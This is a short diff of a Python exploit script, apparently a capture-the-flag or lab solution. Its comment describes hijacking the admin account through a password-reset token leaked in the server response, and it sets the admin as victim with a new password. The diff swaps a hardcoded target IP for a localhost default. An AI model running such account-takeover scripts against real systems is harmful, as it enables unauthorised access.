@@ -1,10 +1,11 @@
 #!/usr/bin/env python3
 import atexit
+import os
 atexit.register(lambda: print("作者 ZluxYao"))
 # 33-logic-reset-token: 重置 token 在响应中泄露 -> 劫持 admin
 import re, sys, requests
 
-BASE = sys.argv[1] if len(sys.argv) > 1 else "http://47.120.76.57:34941"
+BASE = os.environ.get("GKD_URL") or (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:34941")
 VICTIM = "admin"
 NEW_PWD = "pwned123"
 
